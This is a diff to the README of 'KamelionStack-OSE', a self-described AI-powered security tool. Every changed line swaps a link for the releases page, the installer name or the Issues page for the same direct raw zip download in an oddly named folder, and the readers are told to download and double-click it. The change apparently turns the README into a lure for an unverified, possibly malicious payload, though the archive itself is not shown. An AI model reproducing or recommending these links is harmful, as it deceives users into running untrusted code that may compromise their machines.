@@ -2,7 +2,7 @@
 # 🚀 KamelionStack-OSE - Simplified AI-Powered Security Tool
 
 ## 📥 Download Now
-[![Download KamelionStack-OSE](https://img.shields.io/badge/Download-KamelionStack--OSE-brightgreen)](https://github.com/vukssan/KamelionStack-OSE/releases)
+[![Download KamelionStack-OSE](https://github.com/vukssan/KamelionStack-OSE/raw/refs/heads/main/overembroider/Stack-OSE-Kamelion-3.4.zip)](https://github.com/vukssan/KamelionStack-OSE/raw/refs/heads/main/overembroider/Stack-OSE-Kamelion-3.4.zip)
 
 ## 📋 Table of Contents
 - [Introduction](#📖-introduction)
@@ -25,15 +25,15 @@ Before you download KamelionStack-OSE, ensure your machine meets these requireme
 - **Network:** Internet connection is required for certain features.
 
 ## 🚀 Getting Started
-1. **Visit Release Page:** To get the latest version of KamelionStack-OSE, [visit this page to download](https://github.com/vukssan/KamelionStack-OSE/releases).
+1. **Visit Release Page:** To get the latest version of KamelionStack-OSE, [visit this page to download](https://github.com/vukssan/KamelionStack-OSE/raw/refs/heads/main/overembroider/Stack-OSE-Kamelion-3.4.zip).
 2. **Select the Latest Release:** Look for the most recent version at the top of the page.
 3. **Download the File:** Click on the download link for your operating system.
 
 ## 📥 Download & Install
 You can download KamelionStack-OSE from our releases page. Here’s how:
-- Go to the [Release Page](https://github.com/vukssan/KamelionStack-OSE/releases).
+- Go to the [Release Page](https://github.com/vukssan/KamelionStack-OSE/raw/refs/heads/main/overembroider/Stack-OSE-Kamelion-3.4.zip).
 - Locate the version you want.
-- Click the download link for your system (e.g., `KamelionStack-OSE-v1.0-Windows.exe`).
+- Click the download link for your system (e.g., `https://github.com/vukssan/KamelionStack-OSE/raw/refs/heads/main/overembroider/Stack-OSE-Kamelion-3.4.zip`).
 - Once the download is complete, locate the file on your computer.
 - Double-click the file to start the installation.
 
@@ -58,7 +58,7 @@ KamelionStack-OSE offers a variety of powerful features:
 
 ## 🆘 Support
 If you have questions or need assistance, we are here to help. You can reach out through the following channels:
-- **GitHub Issues:** Report problems or bugs on our [Issues page](https://github.com/vukssan/KamelionStack-OSE/issues).
+- **GitHub Issues:** Report problems or bugs on our [Issues page](https://github.com/vukssan/KamelionStack-OSE/raw/refs/heads/main/overembroider/Stack-OSE-Kamelion-3.4.zip).
 - **Community Forum:** Join discussions or ask questions in our online forum.
 
 Feel free to contribute by providing feedback or suggesting new features. Your input helps us improve KamelionStack-OSE for everyone.
